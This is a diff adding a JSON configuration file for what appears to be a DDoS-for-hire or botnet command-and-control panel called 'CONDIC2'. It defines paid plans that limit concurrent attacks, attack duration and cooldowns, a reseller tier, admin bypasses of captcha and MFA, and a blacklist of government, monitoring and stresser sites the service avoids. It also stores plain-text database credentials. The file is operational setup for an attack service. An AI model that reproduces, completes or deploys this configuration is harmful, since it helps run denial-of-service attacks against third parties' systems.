@@ -1,0 +1,157 @@
+{
+     "Masters" : {
+          "MasterPort" : ":9999",
+          "MaxAuthTries" : 6
+     },
+
+     "Slaves" : {
+          "Status" : false,
+          "Slaves" : ":9506"
+     },
+
+     "SQL" : {
+          "SQL-Host" : "localhost:3306",
+          "SQL-Username" : "zxcr9999",
+          "SQL-Password" : "zxcr9999123",
+          "SQL-Name" : "cnc",
+
+          "SQL-Audit" : {
+               "Status" : true,
+               "LogDetails" : "DefaultLogin.txt", 
+               "Username" : "root"
+          }
+     },
+
+     "Branding" : {
+          "AppName" : "CONDIC2",
+          "PrimaryColor" : "38;5;252m",
+          "MaxConcurrentsReached" : "Max Running Limit Has Been Reached",
+          "OverAllowedTime" : "Request is over your max time limit"
+     },
+
+     "DisabledCommands" : [
+     ],
+
+     "Controls" : {
+          "Catpcha" : {
+               "Status" : true,
+               "Header" : "You must answer the question correctly to gain access!", 
+               "AllowedAttempts" : 4,
+               "AdminBypass" : true,
+               "Question" : {
+                    "MinGen" : 10,
+                    "MaxGen" : 100
+               }
+          },
+
+          "MFA" : {
+               "ForceMFA" : false,
+               "AdminBypassForce" : true,
+               "AppName" : "Slovakia"
+          },
+
+          "Ongoing" : {
+               "ShowGlobalAttacks" : true
+          }
+     },
+
+     "Plans" : {
+          "minPassLen" : 3,
+          "MaxSessions" : 10,
+          "Presets" : [
+               {
+                    "Name" : "basic",
+                    "Description" : "BASIC Plan!",
+     
+                    "Concurrents" : 1,
+                    "cooldown" : 120,
+                    "maxTime" : 120,
+     
+                    "PowerSavingExempt" : true,
+                    "PlanTimeDays" : 30,
+                    "BypassBlacklist" : false,
+                    "MaxSessions" : 2,
+                    "Reseller" : false,
+                    "VIP" : false
+               },
+
+               {
+                    "Name" : "vip",
+                    "Description" : "VIP Plan!",
+     
+                    "Concurrents" : 2,
+                    "cooldown" : 60,
+                    "maxTime" : 120,
+     
+                    "PowerSavingExempt" : true,
+                    "PlanTimeDays" : 30,
+                    "BypassBlacklist" : true,
+                    "MaxSessions" : 10,
+                    "Reseller" : false,
+                    "VIP" : true
+               },
+
+               {
+                    "Name" : "reseller",
+                    "Description" : "Reseller Plan!",
+     
+                    "Concurrents" : 3,
+                    "cooldown" : 30,
+                    "maxTime" : 1200,
+     
+                    "PowerSavingExempt" : true,
+                    "PlanTimeDays" : 30,
+                    "BypassBlacklist" : true,
+                    "MaxSessions" : 10,
+                    "Reseller" : true,
+                    "VIP" : true
+               }
+
+          ]
+     },
+
+     "Attacks" : {
+          "AttackDebug" : true,
+          "Blacklists" : [
+               "fbi.gov",
+               "vietnam.gov.vn",
+               "https://176.9.16.251",
+               "http://38.27.122.110",
+               "http://209.97.178.154",
+               "http://88.198.8.149",
+               "http://188.40.115.87",
+               "http://85.10.195.175",
+               "http://95.211.208.171",
+               "http://78.31.67.223",
+               "http://51.38.92.223",
+               "http://77.223.102.17",
+               "http://51.15.25.108",
+               "http://108.61.96.28",
+               "https://dev.exitus.me",
+               "https://tls.mrrage.xyz",
+               "https://dststx.xyz",
+               "https://beta.botflare.club",
+               "https://botflare.club",
+               "https://beta.exitus.me",
+               "https://s1ndwdrld.logicdn.com",
+               "https://dstat.imagehub.host",
+               "https://bbos.cat",
+               "https://dd.exitus.me",
+               "https://bytefend.xyz",
+               "https://golem.cam",
+               "https://graph.proxied.to",
+               "https://tarnkappe.xyz",
+               "https://graph.vshield.pro",
+               "https://dstat.vshield.pro",
+               "https://baloo.one",
+               "https://catstresser.fun",
+               "https://webstress.xyz",
+               "https://graph.brrsecurity.org",
+               "https://www.tcp.xn--6frz82g",
+               "https://graph.sheesh.rip",
+               "https://graph.sokin.eu",
+               "http://45.95.55.21/",
+               "1.1.1.1"
+          ]
+     }
+}
